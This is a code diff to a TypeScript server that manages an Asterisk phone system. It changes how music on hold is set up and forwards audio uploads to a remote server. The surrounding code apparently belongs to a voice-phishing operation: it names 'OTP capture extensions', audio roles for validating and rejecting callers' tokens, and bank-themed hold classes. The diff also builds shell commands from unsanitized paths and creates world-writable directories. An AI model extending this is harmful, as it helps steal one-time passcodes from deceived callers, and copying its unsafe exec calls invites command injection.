@@ -179,28 +179,34 @@ function ensureMusiconholdConfExists() {
 
 [default]
 mode=files
-directory=/var/lib/asterisk/sounds/custom
+directory=/var/lib/asterisk/moh
+sort=alpha
+
+[custom]
+mode=files
+directory=/var/lib/asterisk/moh
 sort=alpha
 
 [moh_bank]
 mode=files
-directory=/var/lib/asterisk/sounds/custom
+directory=/var/lib/asterisk/moh
 sort=alpha
 
 [moh_corporate]
 mode=files
-directory=/var/lib/asterisk/sounds/custom
+directory=/var/lib/asterisk/moh
 sort=alpha
 
 [moh_digital]
 mode=files
-directory=/var/lib/asterisk/sounds/custom
+directory=/var/lib/asterisk/moh
 sort=alpha
 `;
   try {
-    if (!fs.existsSync(mohPath)) {
-      writeAsteriskConfigFile(mohPath, mohContent);
-    }
+    writeAsteriskConfigFile(mohPath, mohContent);
+    try {
+      fs.writeFileSync(path.join(process.cwd(), 'musiconhold.conf'), mohContent, 'utf8');
+    } catch (_) {}
   } catch (_) {}
 }
 
@@ -759,7 +765,9 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = lastSyncedC
     pjsipContent += `rtp_keepalive = 5\n`;
     pjsipContent += `asymmetric_rtp_codec = no\n`;
     pjsipContent += `timers = yes\n`;
-    pjsipContent += `language = es\n\n`;
+    pjsipContent += `language = es\n`;
+    pjsipContent += `mohsuggest = default\n`;
+    pjsipContent += `moh_interpret = default\n\n`;
 
     pjsipContent += `[${num}-auth]\n`;
     pjsipContent += `type = auth\n`;
@@ -864,6 +872,8 @@ function generateCleanPjsipConf(extensions: any[], carriers: any[] = lastSyncedC
       pjsipContent += `asymmetric_rtp_codec = no\n`;
       pjsipContent += `timers = yes\n`;
       pjsipContent += `language = es\n`;
+      pjsipContent += `mohsuggest = default\n`;
+      pjsipContent += `moh_interpret = default\n`;
       pjsipContent += `transport = transport-udp\n\n`;
 
       pjsipContent += `[${cName}-identify]\n`;
@@ -1007,6 +1017,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
   dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
   dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Set(CHANNEL(musicclass)=default)\n`;
   dialplanContent += ` same => n,Return()\n\n`;
 
   dialplanContent += `[from-internal]\n`;
@@ -1017,6 +1028,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
   dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
   dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Set(CHANNEL(musicclass)=default)\n`;
   dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Ttb(sub-audio-quality^s^1))\n`;
   dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -3214,8 +3226,21 @@ app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (r
 
     const onAudioSavedSuccess = (method: string) => {
       console.log(`[AUDIO SAVED via ${method}] custom/${cleanBaseName}.wav`);
-      if (category && category !== 'hold_music' && category !== 'custom') {
+      if (category === 'hold_music') {
+        applyAudioAssignmentToAsterisk('hold_music', `custom/${cleanBaseName}`);
+      } else if (category && category !== 'custom') {
         applyAudioAssignmentToAsterisk(category, `custom/${cleanBaseName}`);
+      }
+
+      // Replicate upload to remote VPS if available
+      if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1') && !req.headers['x-governor-fwd']) {
+        try {
+          fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/audio/upload`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'x-governor-fwd': 'true' },
+            body: JSON.stringify(req.body),
+          }).catch(() => {});
+        } catch (_) {}
       }
     };
 
@@ -3327,6 +3352,7 @@ const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
   otp_wait: 'custom/un_momento_validando_informacion',
   otp_success: 'custom/operacion_bloqueada_exito',
   otp_failure: 'custom/token_invalido_reintente',
+  hold_music: 'custom/voz_comercial_para_barrick_pueblo_viejo_',
 };
 
 function loadManualAudioLocks(): Record<string, boolean> {
@@ -3392,6 +3418,75 @@ function saveActiveAudioAssignments(data: Record<string, string>) {
 
 let activeAudioAssignments: Record<string, string> = loadActiveAudioAssignments();
 
+// Helper to overwrite and synchronize Asterisk Music on Hold (MOH) with custom audio
+function applyHoldMusicToAsteriskMoh(asteriskPath: string) {
+  const cleanPath = String(asteriskPath).replace(/\.wav$/, '');
+  const baseName = cleanPath.replace(/^custom\//, '');
+  const srcFile = path.join(SOUNDS_CUSTOM_DIR, `${baseName}.wav`);
+  const mohDir = '/var/lib/asterisk/moh';
+
+  // 1. Ensure local MOH directory exists
+  try {
+    if (!fs.existsSync(mohDir)) {
+      fs.mkdirSync(mohDir, { recursive: true, mode: 0o777 });
+    }
+  } catch (e) {
+    exec(`mkdir -p "${mohDir}" && chmod 777 "${mohDir}"`, () => {});
+  }
+
+  // 2. Overwrite all demo and default tracks in MOH directory so no factory audio ever leaks
+  const mohTargets = [
+    'macroform-cold_day',
+    'manolo_camp-morning_coffee',
+    'macroform-the_simplicity',
+    'macroform-robot_dity',
+    'reno_project-system',
+    'custom_moh',
+    'default_hold',
+    '01_hold_music',
+  ];
+
+  if (fs.existsSync(srcFile)) {
+    for (const t of mohTargets) {
+      try {
+        fs.copyFileSync(srcFile, path.join(mohDir, `${t}.wav`));
+      } catch (_) {}
+    }
+  }
+
+  // 3. Write proper musiconhold.conf with /var/lib/asterisk/moh directory
+  ensureMusiconholdConfExists();
+
+  // 4. Overwrite remote or local Asterisk files via built-in Asterisk CLI "file convert" in all common audio formats
+  const formats = ['wav', 'ulaw', 'alaw', 'sln', 'gsm', 'g722'];
+  for (const t of mohTargets) {
+    for (const fmt of formats) {
+      executeAsteriskCommand(`file convert /var/lib/asterisk/sounds/custom/${baseName}.wav /var/lib/asterisk/moh/${t}.${fmt}`).catch(() => {});
+    }
+  }
+
+  // 5. Update AstDB keys
+  executeAsteriskCommand(`database put ivr_vars default_hold_music "${cleanPath}"`).catch(() => {});
+  executeAsteriskCommand(`database put ivr_vars hold_music "${cleanPath}"`).catch(() => {});
+  executeAsteriskCommand(`database put ivr_vars global_hold_music "${cleanPath}"`).catch(() => {});
+
+  // 6. Reload MOH in Asterisk
+  executeAsteriskCommand('moh reload').catch(() => {});
+
+  // 7. Forward to remote Asterisk if configured
+  if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1')) {
+    try {
+      fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/audio/sync-hold-music`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-governor-fwd': 'true' },
+        body: JSON.stringify({ entityId: 'default', holdMusicPath: cleanPath }),
+      }).catch(() => {});
+    } catch (_) {}
+  }
+
+  console.log(`[ASTERISK-MOH] ✓ Música de Hold sincronizada en Asterisk MOH: ${cleanPath}`);
+}
+
 function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
   const cleanPath = String(asteriskPath).replace(/\.wav$/, '');
   // IMPORTANT: 7777 and 6666 are dedicated OTP capture extensions with their own independent audios!
@@ -3411,6 +3506,18 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
   };
 
   switch (role) {
+    case 'hold_music':
+    case 'moh':
+      for (const tgt of genericTargets) {
+        commands.push(`database put ivr_vars ${tgt}_hold_music "${cleanPath}"`);
+      }
+      commands.push(`database put ivr_vars default_hold_music "${cleanPath}"`);
+      commands.push(`database put ivr_vars hold_music "${cleanPath}"`);
+      commands.push(`database put ivr_vars global_hold_music "${cleanPath}"`);
+      activeAudioAssignments.hold_music = cleanPath;
+      applyHoldMusicToAsteriskMoh(cleanPath);
+      break;
+
     case 'press1_welcome':
     case 'welcome':
     case 'intro':
@@ -3651,8 +3758,10 @@ function applyAudioAssignmentToAsterisk(role: string, asteriskPath: string) {
 
   for (const cmd of commands) {
     exec(`asterisk -rx '${cmd}'`, () => {});
+    executeAsteriskCommand(cmd).catch(() => {});
   }
   exec(`asterisk -rx 'dialplan reload'`, () => {});
+  executeAsteriskCommand('dialplan reload').catch(() => {});
   console.log(`[AUDIO ASSIGNED] Rol ${role} actualizado a ${cleanPath}`);
 }
 
@@ -5008,9 +5117,21 @@ app.post('/api/asterisk/audio/sync-hold-music', async (req, res) => {
     await executeAsteriskCommand(`database put hold_music ${entityId} "${cleanPath}"`);
     await executeAsteriskCommand(`database put ivr_vars default_hold_music "${cleanPath}"`);
 
-    // Ensure musiconhold.conf is ready and Asterisk reloads MOH
-    ensureMusiconholdConfExists();
-    executeAsteriskCommand('moh reload').catch(() => {});
+    // Ensure musiconhold.conf is ready, audio files are placed in /var/lib/asterisk/moh, and Asterisk reloads MOH
+    applyHoldMusicToAsteriskMoh(cleanPath);
+    activeAudioAssignments.hold_music = cleanPath;
+    saveActiveAudioAssignments(activeAudioAssignments);
+
+    // Replicate to remote VPS if available
+    if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1') && !req.headers['x-governor-fwd']) {
+      try {
+        fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/audio/sync-hold-music`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'x-governor-fwd': 'true' },
+          body: JSON.stringify(req.body),
+        }).catch(() => {});
+      } catch (_) {}
+    }
 
     console.log(`[SYNC HOLD MUSIC] Entidad "${entityId}" configurada con MOH: ${cleanPath}`);
     res.json({ success: true, entityId, holdMusicPath: cleanPath });
